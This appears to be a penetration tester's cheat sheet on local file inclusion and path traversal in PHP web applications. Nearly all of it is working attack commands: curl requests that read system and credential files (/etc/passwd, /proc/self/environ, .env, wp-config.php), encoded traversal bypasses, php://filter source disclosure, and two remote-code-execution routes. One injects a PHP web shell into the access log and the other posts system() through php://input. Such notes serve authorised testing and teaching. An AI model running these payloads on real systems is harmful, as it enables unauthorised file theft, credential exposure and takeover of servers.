# LFI / path traversal

[← Foothold](../02-foothold.md) · [RFI](rfi.md) · [curl helper](../scripts/lfi-enum)

## Confirm

```bash
curl -sS -G 'http://<target>/index.php' --data-urlencode 'page=does-not-exist-12345'
curl -sS -G 'http://<target>/index.php' --data-urlencode 'page=../../../../etc/passwd'
curl --path-as-is 'http://<target>/download/../../etc/passwd'  # if input is in the URL path
```

Compare with the missing-file response. Confirm with file content, not status or length alone. Errors may disclose the prepended directory or appended extension.

## Enumerate with curl

```bash
./scripts/lfi-enum -u 'http://<target>/index.php?page=FUZZ'
./scripts/lfi-enum -u 'http://<target>/index.php?page=FUZZ' -d 8 -w ./paths.txt -b ./cookies.txt
```

Tests absolute paths and `../` depths; saves every body plus a missing-file control per depth. `DIFF` in `results.tsv` is a lead to inspect, not a confirmed read.

## Files worth trying

```text
Linux:   /etc/passwd  /etc/hostname  /proc/self/status  /proc/self/cmdline
         /proc/self/environ  /proc/self/cwd/index.php
         /var/www/html/.env  /var/www/html/config.php  /var/www/html/wp-config.php
Windows: C:\Windows\win.ini  C:\inetpub\wwwroot\web.config
```

Use paths revealed by errors or source before expanding a wordlist. `/etc/passwd` lists users, not their password hashes.

## If traversal is filtered

```text
/etc/passwd                    absolute path, no ../
....//....//etc/passwd         if ../ is stripped once
%2e%2e%2fetc%2fpasswd         encoded traversal
%252e%252e%252fetc%252fpasswd double-encoded traversal
```

For encoded forms, place `%` bytes directly in the quoted URL; `--data-urlencode` would encode `%` again.

## PHP source

```bash
curl -sS -G 'http://<target>/index.php' \
  --data-urlencode 'page=php://filter/convert.base64-encode/resource=config.php'
printf '%s' '<BASE64-PORTION>' | base64 -d
```

## LFI → RCE (PHP include only)

Access-log poisoning:

```bash
curl -sS -A '<?php echo shell_exec($_GET["cmd"]); ?>' 'http://<target>/'
curl -sS -G 'http://<target>/index.php' \
  --data-urlencode 'page=../../../../var/log/apache2/access.log' \
  --data-urlencode 'cmd=id'
```

Also try `/var/log/nginx/access.log` or `/var/log/httpd/access_log`. Other controlled local files:

```text
PHP session: /var/lib/php/sessions/sess_<PHPSESSID>
             /var/lib/php5/sess_<PHPSESSID>  /tmp/sess_<PHPSESSID>
Upload:      include the saved upload path
```

`php://input` when remote URL includes are allowed:

```bash
curl -sS -X POST 'http://<target>/index.php?page=php://input&cmd=id' \
  --data-binary '<?php system($_GET["cmd"]); ?>'
```

Confirm output with `id`. Literal PHP source = file read, not execution.

References: [PortSwigger traversal](https://portswigger.net/web-security/file-path-traversal) · [OWASP file inclusion](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion/) · [PHP filters](https://www.php.net/manual/en/wrappers.php.php) · [HackTricks LFI](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html)
